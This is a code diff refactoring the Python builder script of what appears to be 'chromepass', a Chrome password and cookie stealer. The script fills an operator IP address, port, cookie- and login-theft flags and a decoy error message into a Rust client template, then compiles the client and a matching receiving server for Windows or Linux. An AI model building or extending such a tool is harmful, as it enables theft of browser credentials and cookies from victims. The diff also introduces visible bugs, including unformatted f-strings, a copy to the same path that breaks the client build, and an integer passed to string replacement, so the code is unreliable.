@@ -46,7 +46,7 @@ def reset_folders():
         os.mkdir(dist_dir)
 
 
-def compile_client(build_command):
+def compile_client(build_command: str, src_path: str, dist_path: str, filename: str):
     try:
         build = subprocess.Popen(
             ["powershell.exe", build_command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -54,67 +54,83 @@ def compile_client(build_command):
             line = line.decode(encoding="ISO-8859-1").strip()
             print(line)
             logging.debug(line)
+        return copy_after_compilation(src_path, dist_path, filename)
+    except Exception as e:
+        print("[-] Error happened during compilation: {e}")
+    return False
+
+
+def stringify_bool(boolean):
+    return str(boolean).lower()
+
+
+def script_replace(temp_path: str, replacement_map: dict, build_path: str):
+    with open(temp_path, "r") as f:
+        content = f.read()
+        for key, val in replacement_map.items():
+            content = content.replace(key, val)
+    with open(build_path, "w") as f:
+        f.write(content)
+
+
+def copy_after_compilation(src_path, dist_path, filename):
+    try:
+        shutil.copyfile(src_path, dist_path)
+        os.remove(src_path)
+        print("[+] {filename} build was successful")
         return True
     except Exception as e:
-        pass
+        print("[-] {filename} couldn't be copied: {e}")
     return False
 
 
 def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
     if nobuild:
         return True
+    replacement_map = {
+        "<<IP_ADDRESS>>": ip_address,
+        "<<ERROR_BOOL>>": stringify_bool(error_bool),
+        "<<ERROR_MESSAGE>>": error_message,
+        "<<COOKIES_BOOL>>": stringify_bool(cookies),
+        "<<LOGIN_BOOL>>": stringify_bool(login),
+        "<<PORT>>": port
+    }
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
     executable_name = "chromepass.exe"
-    if os.path.exists(temp_path) and not nobuild:
+    src_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
+    dist_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
+    if os.path.exists(temp_path):
         print("[+] Building Client")
         shutil.copyfile(f"{icon_dir}/{icon}",
                         f"{template_dir}/{chromepass_base}/client.ico")
-        with open(temp_path, "r") as f:
-            content = f.read()
-        content = content.replace("<<IP_ADDRESS>>", ip_address)
-        content = content.replace(
-            "<<ERROR_BOOL>>", "true" if error_bool else "false")
-        content = content.replace("<<ERROR_MESSAGE>>", error_message)
-        content = content.replace(
-            "<<COOKIES_BOOL>>", "true" if cookies else "false")
-        content = content.replace(
-            "<<LOGIN_BOOL>>", "true" if login else "false")
-        content = content.replace("<<PORT>>", f"{port}")
-        with open(build_path, "w") as f:
-            f.write(content)
-        if compile_client(build_command):
-            shutil.copyfile(
-                f"{template_dir}/{chromepass_base}/target/release/{executable_name}", f"{dist_dir}/{filename}.exe")
-            os.remove(
-                f"{template_dir}/{chromepass_base}/target/release/{executable_name}")
-            print("[+] Client build Successful")
-            return True
-    else:
-        print(f"[-] Error, file not found: {temp_path}")
+        script_replace(temp_path, replacement_map, build_path)
+        return compile_client(build_command, src_path, dist_path, "Client")
+    print(f"[-] Error, file not found: {temp_path}")
     return False
 
 
 def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
     if nobuild:
         return True
+    replacement_map = {
+        "<<PORT>>": port
+    }
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_server}/src/main.rs"
-    with open(temp_path, "r") as f:
-        content = f.read()
-    content = content.replace("<<PORT>>", f"{port}")
-    with open(build_path, "w") as f:
-        f.write(content)
+    script_replace(temp_path, replacement_map, build_path)
+    build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
+    executable_name = "release/chromepass-server.exe"
+    dist_path = f"{dist_dir}/{filename}.exe"
     if linux:
         nightly = f"{refresh_env}rustup default nightly"
         musl_target = f"{refresh_env}rustup target add x86_64-unknown-linux-musl"
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server};{nightly};{musl_target};cargo build --release --target x86_64-unknown-linux-musl"
         executable_name = "x86_64-unknown-linux-musl/release/chromepass-server"
-    else:
-        build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
-        executable_name = "release/chromepass-server.exe"
-    if os.path.exists(temp_path) and not nobuild:
+        dist_path = f"{dist_dir}/{filename}"
+    src_path = f"{template_dir}/{chromepass_server}/target/{executable_name}"
+    if os.path.exists(temp_path):
         print("[+] Building Server")
         icon_path = f"{template_dir}/{chromepass_server}/server.ico"
         if not linux:
@@ -122,15 +138,8 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
                             f"{template_dir}/{chromepass_server}/server.ico")
         elif os.path.exists(icon_path):
             os.remove(icon_path)
-        if compile_client(build_command):
-            shutil.copyfile(
-                f"{template_dir}/{chromepass_server}/target/{executable_name}", f"{dist_dir}/{filename}" + (".exe" if not linux else ""))
-            os.remove(
-                f"{template_dir}/{chromepass_server}/target/{executable_name}")
-            print("[+] Server build successful")
-            return True
-    else:
-        print(f"[-] Error, file not found: {temp_path}")
+        return compile_client(build_command, src_path, dist_path, "Server")
+    print(f"[-] Error, file not found: {temp_path}")
     return False
 
 
